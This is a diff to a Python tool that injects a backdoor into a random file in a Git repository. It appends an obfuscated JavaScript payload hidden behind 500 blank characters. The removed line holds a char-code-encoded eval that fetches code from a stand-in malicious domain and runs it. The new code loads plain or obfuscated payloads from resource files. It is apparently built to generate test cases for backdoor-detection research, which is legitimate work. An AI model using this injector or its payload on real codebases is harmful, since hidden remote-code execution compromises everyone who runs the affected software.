@@ -2,7 +2,7 @@ import git
 import os
 import random
 
-def inject_bst_vulnerability(repo_path, file_extension=".py", filters=[], n_blank_chars=500) -> str:
+def inject_bst_vulnerability(repo_path, file_extension=".py", filters=[], n_blank_chars=500, obfuscated=False) -> str:
     """
     Performs local manipulations on a Git repository:
     0. Checks if the latest tag is "TEST" and, if so, returns the file that was already modified with the backdoor.
@@ -105,7 +105,18 @@ def inject_bst_vulnerability(repo_path, file_extension=".py", filters=[], n_blan
     #   - Receives the response: The callback function handles the received data (res).
     #   - Executes the response content: The received data is treated as a string (chunk.toString()) and executed via eval().
     fake_vulnerability = " " * n_blank_chars
-    fake_vulnerability += "eval(String.fromCharCode(118,97,114,32,104,116,116,112,115,32,61,32,114,101,113,117,105,114,101,40,39,104,116,116,112,115,39,41,59,104,116,116,112,115,46,103,101,116,40,39,104,116,116,112,115,58,47,47,119,119,119,46,102,97,107,101,109,97,108,105,99,105,111,117,115,119,101,98,115,105,116,101,46,105,116,47,102,97,107,101,45,118,117,108,110,101,114,97,98,105,108,105,116,121,45,100,111,119,110,108,111,97,100,39,44,32,114,101,115,32,61,62,32,114,101,115,46,102,111,114,101,97,99,104,40,99,104,117,110,107,32,61,62,32,101,118,97,108,40,99,104,117,110,107,46,116,111,83,116,114,105,110,103,40,41,41,41,41,59));"
+    
+    # If obfuscated, read the resources/ratatouille_payload_obfuscated.js file.
+    # Otherwise, use the resources/ratatouille_payload.js .
+    #
+    # This code minifies the payload by removing unnecessary characters.
+    if obfuscated:
+        with open(os.path.join('resources', 'ratatouille_payload_obfuscated.js'), 'r', encoding='utf-8') as f:
+            fake_vulnerability += "".join(line.strip() for line in f)
+    else:
+        with open(os.path.join('resources', 'ratatouille_payload.js'), 'r', encoding='utf-8') as f:
+            fake_vulnerability += "".join(line.strip() for line in f)
+    
     try:
         with open(random_file_path, 'a', encoding='utf-8') as f:
             f.write('\n' + fake_vulnerability + '\n')
